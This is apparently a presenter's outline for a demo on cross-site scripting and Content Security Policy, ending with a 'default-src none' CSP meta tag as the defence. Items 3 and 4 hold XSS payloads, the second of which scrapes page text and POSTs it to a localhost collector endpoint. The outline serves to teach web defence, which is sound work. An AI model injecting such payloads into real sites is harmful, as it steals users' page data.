1. Demo site
2. Explain external sources
3. First vulnerability: inject `<img src="/" onerror="alert(1);">`
4. Second vulnerability: `<img src="/" onerror="Array(...document.querySelectorAll('.wines-container div')).map(n => {return {data: n.innerText}}).forEach(text => {fetch('http://localhost:3000/data', {method: 'POST', mode: 'cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(text)})});">`
5. Enter CSP https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
6. <meta http-equiv="Content-Security-Policy" content="default-src 'none';">